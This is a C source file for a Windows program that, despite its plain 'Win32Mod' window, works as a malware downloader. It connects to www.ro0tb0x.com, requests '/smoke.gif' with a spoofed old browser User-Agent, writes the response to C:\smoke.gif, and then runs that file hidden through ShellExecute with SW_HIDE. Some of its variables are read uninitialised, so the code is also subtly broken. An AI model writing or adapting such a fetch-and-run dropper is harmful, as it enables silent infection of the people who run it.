#include <windows.h>
#include <string.h>
#include <stdio.h>

#define WSA_SOCKET WM_USER + 1
#define SERVER "www.ro0tb0x.com"
#define PORT 80
#define MAXBUF (1024 * 64)
#define REMOTEFILE "/smoke.gif"
#define LOCALFILE "C:\\smoke.gif"
#define CRLF "\r\n"

static char* g_szClassName = "API";
char lastbuf[2];
FILE* fd;
HWND g_MainHwnd;
static HINSTANCE g_hInst = NULL;
int download = 0;

void ConnectSocket();
void FlushFile();
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int);

LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	char buffer[MAXBUF] = "\0";
	int retVal = 0, count = 0, num = 0;
	char* p, currchar, prevchar;

	switch(Message)
	{
	case WM_CREATE:
		g_MainHwnd = hwnd;
		ConnectSocket();
	break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
	break;
	case WSA_SOCKET:
		switch(WSAGETSELECTEVENT(lParam))
		{
		case FD_READ:
		/* Read data from socket */
			retVal = recv(wParam,buffer,MAXBUF,0);

			if (download == 0)
			{
				/* Loop through data and point to beginning of file */
				for (count = 0; count < retVal; count++)
				{
					currchar = buffer[count];
					if (currchar == '\n' && prevchar == '\n')
					{
						p = &buffer[count + 1];
						break;
					}
					if (currchar != '\r')
						prevchar = currchar;
				}

				if (p != NULL)
				{
				/* Write all data - header */
					download = 1;
					fd = fopen(LOCALFILE,"w+b");
					fwrite(p,sizeof(char),retVal - count - 1,fd);
				}
			}
			else
			{
				/* More file data */
				fwrite(buffer,sizeof(char),retVal,fd);
			}

		break;
		case FD_CLOSE:
		/* Socket closed */
			fclose(fd);
			ShellExecute(NULL,NULL,LOCALFILE,NULL,NULL,SW_HIDE);
			PostMessage(hwnd,WM_CLOSE,0,0);
		break;
		}
	break;

	default:
		return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
   LPSTR lpCmdLine, int nCmdShow)
{
   WNDCLASSEX WndClass;
   HWND hwnd;
   MSG Msg;

   g_hInst = hInstance;

   WndClass.cbSize        = sizeof(WNDCLASSEX);
   WndClass.style         = 0;
   WndClass.lpfnWndProc   = WndProc;
   WndClass.cbClsExtra    = 0;
   WndClass.cbWndExtra    = 0;
   WndClass.hInstance     = g_hInst;
   WndClass.hIcon         = LoadIcon(g_hInst,"MYICON");
   WndClass.hIconSm       = WndClass.hIcon;
   WndClass.hCursor       = LoadCursor(NULL, IDC_ARROW);
   WndClass.hbrBackground = CreateSolidBrush(RGB(77,149,28));
   WndClass.lpszMenuName  = "MYMENU";
   WndClass.lpszClassName = g_szClassName;
   WndClass.hIconSm       = WndClass.hIcon;

   if(!RegisterClassEx(&WndClass))
   {
      MessageBox(0, "Failed to register class!", "Error!",
         MB_ICONEXCLAMATION | MB_OK | MB_SYSTEMMODAL);
      return 0;
   }

   hwnd = CreateWindowEx(
      WS_EX_CLIENTEDGE,
      g_szClassName,
      "Win32Mod",
      WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT,
      CW_USEDEFAULT,
      420,
      240,
      NULL, NULL, g_hInst, NULL);

   ShowWindow(hwnd, SW_SHOW);
   UpdateWindow(hwnd);

   while(GetMessage(&Msg, NULL, 0, 0))
   {
      TranslateMessage(&Msg);
      DispatchMessage(&Msg);
   }
   return Msg.wParam;
}

void ConnectSocket()
/*
This function will connect the socket to the http server and download the file
*/
{
	WSADATA wsaData;
	SOCKET dlSock;
	LPHOSTENT HostEntry;
	SOCKADDR_IN sin;
	int retVal;
	char msg[MAXBUF];

	/* Start up winsock */
	WSAStartup(MAKEWORD(1,1),&wsaData);

	/* Get address of remote server */
	HostEntry = gethostbyname(SERVER);

	if (HostEntry == NULL)
	{
		MessageBox(g_MainHwnd,"gethostbyname() failure","Fatal Error",MB_ICONERROR | MB_OK);
		return;
	}
	
	/* Set up a TCP socket */
	dlSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (dlSock == INVALID_SOCKET)
	{
		MessageBox(g_MainHwnd,"socket() failure","Fatal Error",MB_ICONERROR | MB_OK);
		return;
	}

	/* Set up server info */
	sin.sin_family = AF_INET;
	sin.sin_addr = *((LPIN_ADDR)*HostEntry->h_addr_list);
	sin.sin_port = htons(PORT);

	/* Connect socket to server */
	retVal = connect(dlSock,(LPSOCKADDR)&sin,sizeof(SOCKADDR_IN));

	if (retVal == SOCKET_ERROR)
	{
		MessageBox(g_MainHwnd,"Unable to connect!","Fatal Error",MB_ICONERROR | MB_OK);
		return;
	}

	/* Put sock in async mode */
	WSAAsyncSelect(dlSock,g_MainHwnd,WSA_SOCKET,FD_READ | FD_CLOSE | FD_WRITE);
	
	/* Socket is connected, now send file request info */
	strcpy(msg,"GET ");
	strcat(msg,REMOTEFILE);
	strcat(msg," HTTP/1.0");
	strcat(msg,CRLF);
	strcat(msg,"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");
	strcat(msg,CRLF);
	strcat(msg,"Accept -Language: en -us");
	strcat(msg,CRLF);
	strcat(msg,"Accept -Encoding: gzip , deflate");
	strcat(msg,CRLF);
	strcat(msg,"User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)");
	strcat(msg,CRLF);
	strcat(msg,"Host: ");
	strcat(msg,SERVER);
	strcat(msg," ");
	strcat(msg,CRLF);
	strcat(msg,"Connection: Keep-Alive");
	strcat(msg,CRLF);
	strcat(msg,CRLF);

	if (send(dlSock,msg,strlen(msg),0) == -1)
	{
		MessageBox(g_MainHwnd,"send() error","Error",MB_OK);
	}
}
